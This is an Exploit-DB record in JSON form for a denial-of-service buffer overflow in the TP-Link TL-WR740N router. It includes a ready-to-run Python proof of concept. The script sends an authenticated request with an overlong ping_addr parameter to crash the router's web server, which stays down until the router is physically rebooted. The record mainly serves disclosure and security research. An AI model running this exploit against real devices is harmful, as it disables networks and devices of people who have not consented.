{"source": "https://www.exploit-db.com/exploits/51866", "vulnName": "TP-Link TL-WR740N - Buffer Overflow 'DOS'", "vulnEDBID": "51866", "vulnCVE": "N/A", "author": "ANISH FEROZ", "exploitType": "WEBAPPS", "platform": "HARDWARE", "datePublished": "2024-03-10", "vulnContent": "# Exploit Title: TP-Link TL-WR740N - Buffer Overflow 'DOS'\n# Date: 8/12/2023\n# Exploit Author: Anish Feroz (ZEROXINN)\n# Vendor Homepage: http://www.tp-link.com\n# Version: TP-Link TL-WR740n 3.12.11 Build 110915 Rel.40896n\n# Tested on: TP-Link TL-WR740N\n\n#Description:\n\n#There exist a buffer overflow vulnerability in TP-Link TL-WR740 router that can allow an attacker to crash the web server running on the router by sending a crafted request. To bring back the http (webserver), a user must physically reboot the router.\n\n#Usage:\n\n#python3 target username password\n#change port, if required\n\n------------------------------------------------POC-----------------------------------------\n\n#!/usr/bin/python\n\nimport requests\nfrom requests.auth import HTTPBasicAuth\nimport base64\n\ndef send_request(ip, username, password):\n    auth_url = f\"http://{ip}:8082\"\n    target_url = f\"http://{ip}:8082/userRpm/PingIframeRpm.htm?ping_addr=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&doType=ping&isNew=new&sendNum=4&pSize=64&overTime=800&trHops=20\"\n\n    credentials = f\"{username}:{password}\"\n    encoded_credentials = base64.b64encode(credentials.encode()).decode()\n\n    headers = {\n        \"Host\": f\"{ip}:8082\",\n        \"Authorization\": f\"Basic {encoded_credentials}\",\n        \"Upgrade-Insecure-Requests\": \"1\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36\",\n        \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\",\n        \"Referer\": f\"http://{ip}:8082/userRpm/DiagnosticRpm.htm\",\n        \"Accept-Encoding\": \"gzip, deflate\",\n        \"Accept-Language\": \"en-US,en;q=0.9\",\n        \"Connection\": \"close\"\n    }\n\n    session = requests.Session()\n    \n    response = session.get(target_url, headers=headers)\n\n    if response.status_code == 200:\n        print(\"Server Crashed\")\n        print(response.text)\n    else:\n        print(f\"Script Completed with status code {response.status_code}\")\n\nip_address = input(\"Enter IP address of the host: \")\nusername = input(\"Enter username: \")\npassword = input(\"Enter password: \")\n\nsend_request(ip_address, username, password)\n            "}